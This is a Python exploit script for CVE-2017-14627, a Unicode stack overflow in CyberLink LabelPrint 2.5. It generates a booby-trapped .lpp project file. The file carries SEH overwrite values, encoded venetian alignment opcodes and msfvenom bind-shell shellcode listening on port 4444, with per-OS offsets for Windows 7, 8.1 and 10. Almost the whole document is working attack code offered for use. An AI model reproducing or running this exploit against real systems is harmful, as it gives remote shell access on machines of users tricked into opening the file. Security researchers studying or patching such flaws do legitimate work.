#!/usr/bin/python
# Exploit Title: CyberLink LabelPrint <=2.5 File Project Processing Unicode Stack Overflow
# Date: September 23, 2017
# Exploit Author: f3ci
# Vendor Homepage: https://www.cyberlink.com/
# Software Link: http://update.cyberlink.com/Retail/Power2Go/DL/TR170323-021/CyberLink_Power2Go_Downloader.exe
# Version: 2.5
# Tested on: Windows 7x86, Windows8.1x64, Windows 10
# CVE : CVE-2017-14627
# 
# Note: Cyberlink LabelPrint is bundled with Power2Go application and also included in most HP, Lenovo, and Asus laptops.
# this proof of concept is based on the LabelPrint 2.5 that comes with Power2Go installation.

def exp():
    header = ("\x3c\x50\x52\x4f\x4a\x45\x43\x54\x20\x76\x65\x72\x73\x69\x6f\x6e"
    "\x3d\x22\x31\x2e\x30\x2e\x30\x30\x22\x3e\x0a\x09\x3c\x49\x4e\x46"
    "\x4f\x52\x4d\x41\x54\x49\x4f\x4e\x20\x74\x69\x74\x6c\x65\x3d\x22"
    "\x22\x20\x61\x75\x74\x68\x6f\x72\x3d\x22\x22\x20\x64\x61\x74\x65"
    "\x3d\x22\x37\x2f\x32\x34\x2f\x32\x30\x31\x37\x22\x20\x53\x79\x73"
    "\x74\x65\x6d\x54\x69\x6d\x65\x3d\x22\x32\x34\x2f\x30\x37\x2f\x32"
    "\x30\x31\x37\x22\x3e")
    filename2 = "labelprint_poc_universal.lpp"
    f = open(filename2,'w')
    junk = "A" * 790
    nseh = "\x61\x42"
    seh = "\x2c\x44"
    nop = "\x42"
 
    #msfvenom -p windows/shell_bind_tcp LPORT=4444 -e x86/unicode_mixed BufferRegister=EAX -f python
    buf = ""
    buf += "PPYAIAIAIAIAIAIAIAIAIAIAIAIAIAIAjXAQADAZABARALAYAIAQ"
    buf += "AIAQAIAhAAAZ1AIAIAJ11AIAIABABABQI1AIQIAIQI111AIAJQYA"
    buf += "ZBABABABABkMAGB9u4JBkL7x52KPYpM0aPqyHeMa5pbDtKNpNPBk"
    buf += "QBjlTKaBkd4KD2mXzo87pJlfNQ9ovLOLs1cLIrnLMPGQfoZmyqI7"
    buf += "GrZRobnwRk1Bn0bknjOLDKPLkaQhGsNhzawaOa4KaIO0M1XSbka9"
    buf += "lXISmja9Rkp4TKM1FvMaYofLfaXOjmYqUw08wp0uJVJcqmYhmk3M"
    buf += "o4rUk41HTK28NDjaFsrFRklLPK4KaHklzaICTKytbkM1VpSYa4nD"
    buf += "NDOkaKaQ291JoaIoWpqOaOQJtKN2HkTMOmOxOCOBIpm0C8CGT3oB"
    buf += "OopTC80L2WNFzgyoz5Txf0ZaYpm0kyfdB4np38kycPpkypIoiEPj"
    buf += "kXqInp8bKMmpr010pPC8YZjoiOK0yohU67PhLBypjq1L3YzF1ZLP"
    buf += "aFaGPh7R9KoGBGKO8U271XEg8iOHIoiohUaGrH3DJLOK7qIo9EPW"
    buf += "eG1XBU0nnmc1YoYEC81SrMs4ip4IyS27ogaGnQjVaZn2B9b6jBkM"
    buf += "S6I7oTMTMliqkQ2m14nDN0UvKPndb4r0of1FNv0Fr6nn0VR6B31F"
    buf += "BH49FlmoTFyoIEbi9P0NPVq6YolpaXjhsWmMc0YoVuGKHpEe3rnv"
    buf += "QXVFce5mcmkOiEMlKV1lLJ3Pyk9PT5m5GKoWZsSBRO2JypPSYoxUAA"
    

    #preparing address for decoding
    ven = nop               #nop/inc edx
    ven += "\x54"           #push esp
    ven += nop              #nop/inc edx
    ven += "\x58"           #pop eax
    ven += nop              #nop/inc edx
    ven += "\x05\x1B\x01"   #add eax 01001B00 universal
    ven += nop              #nop/inc edx
    ven += "\x2d\x01\x01"   #sub eax 01001000
    ven += nop              #nop/inc edx
    ven += "\x50"           #push eax
    ven += nop              #nop/inc edx
    ven += "\x5c"           #pop esp

    #we need to encode the RET address, since C3 is bad char.
    #preparing ret opcode
    ven += nop              #nop/inc edx
    ven += "\x25\x7e\x7e"   #and eax,7e007e00
    ven += nop              #nop/inc edx
    ven += "\x25\x01\x01"   #and eax,01000100
    ven += nop              #nop/inc edx
    ven += "\x35\x7f\x7f"   #xor eax,7f007f00
    ven += nop              #nop/inc edx
    ven += "\x05\x44\x44"   #add eax,44004400
    ven += nop              #nop/inc edx
    ven += "\x57"           #push edi
    ven += nop              #nop/inc edx
    ven += "\x50"           #push eax
    ven += junk2            #depending OS
   
    #custom venetian 
    ven += "\x58"           #pop eax
    ven += nop              #nop/inc edx
    ven += "\x58"           #pop eax
    ven += nop              #nop/inc edx
    ven += align            #depending OS
    ven += nop              #nop/inc edx
    ven += "\x2d\x01\x01"   #add eax, 01000100 #align eax to our buffer
    ven += nop              #nop/inc edx
    ven += "\x50"           #push eax
    ven += nop              #nop/inc edx
 
    #call esp 0x7c32537b MFC71U.dll
    ven += "\x5C"           #pop esp
    ven += nop              #nop/inc edx
    ven += "\x58"           #pop eax
    ven += nop              #nop/inc edx
    ven += "\x05\x53\x7c"   #add eax 7c005300 part of call esp
    ven += nop              #nop/inc edx
    ven += "\x50"           #push eax
    ven += junk1            #depending OS
    ven += "\x7b\x32"       #part of call esp
 
    #preparing for shellcode
    ven += nop * 114        #junk
    ven += "\x57"           #push edi
    ven += nop              #nop/inc edx
    ven += "\x58"           #pop eax
    ven += nop              #nop/inc edx
    ven += align2           #depending OS
    ven += nop              #nop/inc edx
    ven += "\x2d\x01\x01"   #sub eax,01000100
    ven += nop              #nop/inc edx
    ven += buf              #shellcode

    sisa =  nop * (15000-len(junk+nseh+seh+ven))
    payload = junk+nseh+seh+ven+sisa
    bug="\x09\x09\x3c\x54\x52\x41\x43\x4b\x20\x6e\x61\x6d\x65\x3d"+'"'+payload+'"'+"/>\n" 
    bug+=("\x09\x3c\x2f\x49\x4e\x46\x4f\x52\x4d\x41\x54\x49\x4f\x4e\x3e\x0a"
    "\x3c\x2f\x50\x52\x4f\x4a\x45\x43\x54\x3e")
    f.write(header+ "\n" + bug)

    print "[+] File", filename2, "successfully created!"
    print "[*] Now open project file", filename2, "with CyberLink LabelPrint."
    print "[*] Good luck ;)"
    f.close()
 
print "[*] <--CyberLink LabelPrint <=2.5 Stack Overflow POC-->"
print "[*] by f3ci & modpr0be <research[at]spentera.id>"
print "[*] <------------------------------------------------->\n"
print "\t1.Windows 7 x86 bindshell on port 4444"
print "\t2.Windows 8.1 x64 bindshell on port 4444"
print "\t3.Windows 10 x64 bindshell on port 4444\n" 
input = input("Choose Target OS : ")
try:
    if input == 1:
            align   = "\x05\x09\x01"    #add eax,01000400
            align2  = "\x05\x0A\x01"    #add eax, 01000900
            junk1   = '\x42' * 68       #junk for win7x86
            junk2   = '\x42' * 893      #junk for win7x86
            exp()
    elif input == 2:
            align   = "\x05\x09\x01"    #add eax,01000400
            align2  = "\x05\x0A\x01"    #add eax, 01000900
            junk1   = '\x42' * 116      #junk for win8.1x64
            junk2   = '\x42' * 845      #junk for win8.1x64
            exp()
    elif input == 3:
            align   = "\x05\x05\x01"    #add eax,01000400
            align2  = "\x05\x06\x01"    #add eax, 01000900
            junk1   = '\x42' * 136      #junk for win10x64
            junk2   = '\x42' * 313      #junk for win10x64
            exp()    
    else:
            print "Choose the right one :)"
except:
    print ""